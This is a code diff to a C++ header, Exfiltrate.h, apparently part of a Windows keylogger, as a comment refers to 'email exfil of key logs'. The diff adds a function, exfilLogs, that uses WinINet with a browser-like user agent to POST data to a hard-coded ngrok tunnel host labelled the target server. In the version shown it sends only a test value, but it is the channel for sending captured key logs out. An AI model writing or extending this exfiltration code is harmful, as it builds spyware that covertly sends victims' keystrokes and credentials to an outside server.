@@ -1,10 +1,13 @@
 #ifndef EXFILTRATE_H
 #define EXFILTRATE_H
 
+#pragma comment(lib, "wininet.lib")
+
 #include <fstream>
 #include <vector>
 #include <string>
 #include <Windows.h>
+#include <wininet.h>
 #include <iostream>
 #include "IO.h"
 #include "Timer.h"
@@ -12,11 +15,55 @@
 
 namespace Exfiltrate
 {
-	bool exfilLogs()
+	bool exfilLogs(std::string pathToExfilLogFile)
 	{
-		return true;
+		std::wstring headers = L"Content-Type: application/x-www-form-urlencoded; charset=utf-16";
+		std::wstring postData = L"os=test";
+
+		std::string ngrokTunnel = "7fd0-2601-2c7-4300-ac0-b988-2097-b67-790c.ngrok.io";
+		std::wstring temp = std::wstring(ngrokTunnel.begin(), ngrokTunnel.end());
+		LPCWSTR ngrokTunnelL = temp.c_str();
+
+		HINTERNET hSession = InternetOpen(
+			L"Mozilla/5.0", 
+			INTERNET_OPEN_TYPE_PRECONFIG,
+			NULL,
+			NULL,
+			0);
+
+		HINTERNET hConnect = InternetConnect(
+			hSession,
+			ngrokTunnelL, //TARGET SERVER
+			0,
+			L"",
+			L"",
+			INTERNET_SERVICE_HTTP,
+			0,
+			0);
+
+		HINTERNET hHttpFile = HttpOpenRequest(
+			hConnect,
+			L"POST", //HTTP METHOD
+			L"/", //URI
+			NULL,
+			NULL,
+			NULL,
+			0,
+			0);
+
+		if (HttpSendRequest(hHttpFile, headers.c_str(), 
+			headers.length(), (LPVOID)postData.c_str(), 
+			postData.length() * sizeof(wchar_t)))
+		{
+			return true;
+		}
+		else
+		{
+			return false;
+		}
 	}
-	
+}
+
 	//=============================================================================================================
 	/* My spectacular failure at email exfil of key logs */
 	//=============================================================================================================
@@ -186,7 +233,5 @@ namespace Exfiltrate
 	//	
 	//	return (int)exitCode;
 	//}
-}
-
 
 #endif 
